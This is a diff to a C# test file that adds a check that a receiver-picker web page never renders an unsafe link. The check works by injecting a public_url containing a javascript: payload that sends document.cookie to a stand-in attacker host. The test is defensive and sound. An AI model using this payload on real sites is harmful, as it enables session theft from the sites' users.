@@ -109,6 +109,32 @@ public class MonitorPageTests
                 "a visitor who can do nothing about it should be told that too");
     }
 
+    [Fact]
+    public async Task The_Picker_Page_Never_Renders_A_Link_It_Cannot_Vouch_For()
+    {
+        string node = ResolveNode();
+        Assert.SkipWhen(node.Length == 0, "node is not installed; the page cannot be executed");
+
+        // The page is the thing that actually writes the href, so it checks too - the daemon
+        // having already refused this string is the first of two, not the only one. Driven with
+        // the daemon's check defeated, by handing the page a snapshot straight from a directory
+        // that carries one.
+        await using var host = await Harness.StartAsync(
+            directoryJson: Harness.DirectoryJson.Replace(
+                "\"public_url\": \"https://m9psy-1.instance.ubersdr.org/\"",
+                "\"public_url\": \"javascript:fetch('https://attacker.example/'+document.cookie)\""));
+
+        Probe probe = await RunProbeAsync(node, host.Port);
+
+        probe.Thrown.Should().BeEmpty();
+        string.Join("", probe.Rows).Should().NotContain("javascript:");
+
+        // The row is still there and still links to the receiver's page, because the daemon put
+        // the endpoint's own URL in place of the one it would not carry.
+        string dalgety = probe.Rows.Single(r => r.Contains("M9PSY-1"));
+        dalgety.Should().Contain("https://m9psy-1.instance.ubersdr.org/");
+    }
+
     private sealed record Probe(
         string Title,
         string Heading,
@@ -191,9 +217,10 @@ public class MonitorPageTests
         private readonly MonitorHost _host;
         private string? _failure;
 
-        private Harness(int port, string? coldFailure)
+        private Harness(int port, string? coldFailure, string directoryJson)
         {
             _failure = coldFailure;
+            _directoryJson = directoryJson;
             Port = port;
             _host = new MonitorHost(new MonitorHostOptions
             {
@@ -215,18 +242,22 @@ public class MonitorPageTests
                 TimeProvider = new FakeTimeProvider(),
                 Journal = _ => new StationJournal("", _ => { }, _ => { }),
                 FetchDirectory = _ => _failure is null
-                    ? Task.FromResult(DirectoryJson)
+                    ? Task.FromResult(_directoryJson)
                     : Task.FromException<string>(new HttpRequestException(_failure)),
                 OpenInput = (receiver, log, token) => throw new InvalidOperationException(
                     "no receiver is picked in these tests"),
             });
         }
 
+        private readonly string _directoryJson;
+
         internal int Port { get; }
 
-        internal static async Task<Harness> StartAsync(string? coldFailure = null)
+        internal static async Task<Harness> StartAsync(
+            string? coldFailure = null, string? directoryJson = null)
         {
-            var harness = new Harness(FreePorts.Next(), coldFailure);
+            var harness = new Harness(
+                FreePorts.Next(), coldFailure, directoryJson ?? DirectoryJson);
             (await harness._host.StartAsync()).Should().Be(0);
             return harness;
         }
@@ -241,7 +272,7 @@ public class MonitorPageTests
         }
 
         /// <summary>Three receivers: two with room, one full.</summary>
-        private const string DirectoryJson = """
+        internal const string DirectoryJson = """
             {"count": 3, "instances": [
               {"host": "m9psy-1.instance.ubersdr.org", "port": 443, "tls": true,
                "callsign": "M9PSY-1", "name": "RX888 with 40m Full Wave Loop (GPSDO)",
